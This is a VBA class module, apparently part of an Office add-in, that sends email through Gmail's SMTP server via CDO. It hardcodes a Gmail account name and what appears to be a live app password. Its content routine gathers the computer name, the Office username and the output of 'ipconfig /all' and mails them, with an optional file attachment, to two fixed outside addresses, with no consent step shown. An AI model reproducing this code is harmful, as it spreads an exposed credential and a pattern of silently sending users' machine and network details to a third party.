VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
END
Attribute VB_Name = "EmailCDO"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
' Check README.md for more information
'thuthuataccess.com/forum/thread-12329.html
'codekabinett.com/rdumps.php?Lang=2&targetDoc=send-email-access-vba-cdo
'rondebruin.nl/win/s1/cdo.htm
'techsupt.winbatch.com/webcgi/webbatch.exe?techsupt/nftechsupt.web+WinBatch/OLE~COM~ADO~CDO~ADSI~LDAP/ADO~DAO/ADSI~LDAP~CDO/CDO+Send~Email~Using~CDO~SSL~via~GMAIL.txt
Option Explicit
' Declare Variables
Private info As InfoConstants
Private system As SystemUpdate
Private fileSystem As Object
Private userResponse As VbMsgBoxResult
Private Internet As InternetConnector
Private emailConfig As Object 'IConfiguration Object
Private emailMessage As Object 'IMessage Object
Private SMTPFields As Object 'Fields Oject
Private Const EMAIL_USERNAME As String = "vba.khongchuyen@gmail.com"
Private Const EMAIL_PASSWORD As String = "qtfartdincwoayym"
Private Const SMTP_SEVER As String = "smtp.gmail.com"
Private Const LOAD_DEFAULT As Integer = -1
Private Const SEND_USING As Byte = 2
Private Const SEVER_PORT As Integer = 465 '25
Private Const SMTP_AUTHENTICATE As Byte = 1
Private Const USE_SSL As Boolean = True
Private Const SCHEMAS As String = _
    "http://schemas.microsoft.com/cdo/configuration/"
Private Const SCHEMAS_SEND_USING As String = _
    "http://schemas.microsoft.com/cdo/configuration/sendusing"
Private Const SCHEMAS_USERNAME As String = _
    "http://schemas.microsoft.com/cdo/configuration/sendusername"
Private Const SCHEMAS_PASSWORD As String = _
    "http://schemas.microsoft.com/cdo/configuration/sendpassword"
Private Const SCHEMAS_SMTP_SEVER As String = _
    "http://schemas.microsoft.com/cdo/configuration/smtpserver"
Private Const SCHEMAS_SEVER_PORT As String = _
    "http://schemas.microsoft.com/cdo/configuration/smtpserverport"
Private Const SCHEMAS_AUTTHENTICATE As String = _
    "http://schemas.microsoft.com/cdo/configuration/smtpauthenticate"
Private Const SCHEMAS_USE_SSL As String = _
    "http://schemas.microsoft.com/cdo/configuration/smtpusessl"
' Initialize Variables
Private Function hasVariables() As Boolean
On Error GoTo ErrorHandle
    Set info = New InfoConstants
    Set system = New SystemUpdate
    Set Internet = New InternetConnector
    Set fileSystem = system.createFileSystem
    Set emailConfig = system.createCDOConfig
    Set emailMessage = system.createCDOMess
    Let hasVariables = True
    GoTo ExecuteProcedure
ErrorHandle:
    Call system.tackleErrors
ExecuteProcedure:
End Function
' Constructor
Private Sub Class_Initialize()
'
End Sub
' Destructor
Private Sub Class_Terminate()
    Set info = Nothing
    Set system = Nothing
End Sub
' ASSESSORS
' MUTATORS
' METHODS
Private Sub setEmailConfig( _
    Optional ByRef username As String = EMAIL_USERNAME, _
    Optional ByRef password As String = EMAIL_PASSWORD)
    With emailConfig
        .Load LOAD_DEFAULT  ' Load All CDO Source Defaults Configurations
    End With
    Set SMTPFields = emailConfig.fields
    With SMTPFields
        .item(SCHEMAS_SEND_USING) = SEND_USING
        .item(SCHEMAS_SMTP_SEVER) = SMTP_SEVER
        .item(SCHEMAS_SEVER_PORT) = SEVER_PORT
        .item(SCHEMAS_AUTTHENTICATE) = SMTP_AUTHENTICATE
        .item(SCHEMAS_USERNAME) = username
        .item(SCHEMAS_PASSWORD) = password
        .item(SCHEMAS_USE_SSL) = USE_SSL
        .Update
    End With
End Sub
Private Sub setEmailContent(Optional ByRef attachmentPath As String)
    Dim PWShell As PowerShellController
    Set PWShell = New PowerShellController
    With emailMessage
        .From = "vba.khongchuyen@gmail.com"
        .To = "meovang658@gmail.com;meo658@yahoo.com"
        .CC = ""
        .BCC = ""
        .Subject = _
            Environ$("computername") & _
            " - " & _
            Format(Now, "YYYY/MM/DD hh:mm:ss")
        .TextBody = _
            Environ$("computername") & _
            vbNewLine & _
            Application.username & _
            PWShell.executeScript("ipconfig /all")
     'TODO: Create magic num to variable and Assessor and Mutator
    End With
    If fileSystem.FileExists(attachmentPath) Then
        With emailMessage
            .AddAttachment (attachmentPath)
        End With
    End If
End Sub
Private Sub sendEmail()
    If Internet.isConnect Then
        With emailMessage
            .Configuration = emailConfig
            .send
        End With
    Else
        MsgBox _
                Prompt:=info.getPrompt & _
                    "Please check your internet connection again !!!", _
                Buttons:=vbOKOnly + vbExclamation, _
                Title:=info.getAuthor
        'TO-DO: Prompt to CONST
    End If
 End Sub
' MAIN
Public Sub send(Optional ByRef attachmentPath As String)
On Error GoTo ErrorHandle
    If Not hasVariables Then GoTo ExecuteProcedure
        Call system.speedOn
        Call setEmailConfig
        Call setEmailContent(attachmentPath)
        Call sendEmail
    GoTo ExecuteProcedure
ErrorHandle:
        Call system.tackleErrors
ExecuteProcedure:
        Call system.speedOff
End Sub





